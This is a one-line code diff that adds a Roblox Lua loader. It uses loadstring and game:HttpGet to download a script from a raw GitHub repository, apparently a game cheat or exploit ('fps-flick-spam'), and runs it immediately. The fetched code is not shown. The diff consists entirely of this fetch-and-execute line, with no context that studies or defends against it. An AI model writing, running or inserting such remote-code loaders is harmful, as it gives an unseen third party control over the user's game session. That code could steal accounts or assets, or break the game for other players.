@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/fps-flick-spam0-wli2l40lo8m4u5.lua"))()
